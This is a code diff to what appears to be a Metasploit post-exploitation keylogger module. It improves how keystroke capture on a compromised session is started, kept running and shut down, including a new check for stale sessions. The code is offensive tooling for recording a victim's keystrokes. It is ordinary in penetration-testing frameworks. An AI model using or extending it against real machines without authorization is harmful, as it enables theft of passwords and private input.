@@ -211,6 +211,7 @@ class MetasploitModule < Msf::Post
   # @return [TrueClass] keylogger started successfully
   # @return [FalseClass] keylogger failed to start
   def startkeylogger
+    session.ui.keyscan_stop rescue nil #Stop keyscan if it was already running for some reason.
     begin
       print_status("Starting the keylog recorder...")
       session.ui.keyscan_start
@@ -247,8 +248,8 @@ class MetasploitModule < Msf::Post
 
     while rec == 1
       begin
+        sleep(@interval)
         if session_good?
-          sleep(@interval)
           write_keylog_data
         else
           print_status("Session: #{datastore['SESSION']} is stale or has been closed. Exiting keylog recorder.")
@@ -260,10 +261,9 @@ class MetasploitModule < Msf::Post
           @timed_out = true
         elsif e.class.to_s == "Interrupt"
           print_status("User interrupt. Exiting keylog recorder.")
-          rec = 0
-          return
         else
-          print_error("Keylog recorder encounted Error: #{e.class} #{e} Exiting...")
+          print_error("Keylog recorder encountered error: #{e.class} (#{e}) Exiting...")
+          @timed_out = true
         end
         rec = 0
       end
@@ -277,11 +277,36 @@ class MetasploitModule < Msf::Post
   # @return [TrueClass] Session is still alive (Framework) and not stale
   # @return [FalseClass] Session is dead or deamed stale
   def session_good?
-    return false unless session.alive?
+    return false if !session.alive?
     session_age = Time.now.to_i - session.last_checkin.to_i
     return false if session_age >= @timeout
     return false if @timed_out
     return true
+  end
+
+  # This function is used at module close time to determine if the session
+  # might be going state. This help to prevent the module from having to wait until
+  # time-out before exiting which can happen if the session is unresponsive just prior
+  # to the final call to write_keylog_data or the call to session.ui.keyscan_stop
+  #
+  # @return [TrueClass] Session is still responding
+  # @return [FalseClass] Session has not responded during the set timeframe (30 seconds)
+  def going_stale?
+    session_age1 = Time.now.to_i - session.last_checkin.to_i
+    sleep(10)
+    session_age2 = Time.now.to_i - session.last_checkin.to_i
+
+    if session_age2 > session_age1
+      sleep(10)
+      session_age3 = Time.now.to_i - session.last_checkin.to_i
+      if session_age3 > session_age2
+        print_status("Session #{datastore['SESSION']} is likely going stale. Stand by...")
+        sleep(10)
+        session_age4 = Time.now.to_i - session.last_checkin.to_i
+        return true if session_age4 > session_age3
+      end
+    end
+    return false
   end
 
   # This function writes off the last set of key strokes
@@ -289,15 +314,16 @@ class MetasploitModule < Msf::Post
   #
   # @return [void] A useful return value is not expected here
   def finish_up
-    print_status("Shutting down the keylog recorder. Stand by.")
-    sleep(@interval)
+    print_status("Shutting down keylog recorder. Please wait...")
+    return if going_stale?
+
     begin
       write_keylog_data
     rescue::Exception => e
       if e.class.to_s == "Rex::TimeoutError"
-        print_status("Session: #{datastore['SESSION']} is not responding. Exiting keylog recorder.")
+        print_status("Session: #{datastore['SESSION']} is not responding.")
       else
-        print_error("Keylog recorder encounted Error: #{e.class} #{e} Exiting...")
+        print_error("Keylog recorder encountered error: #{e.class.to_s} (#{e.to_s}) Exiting...")
       end
       return
     end
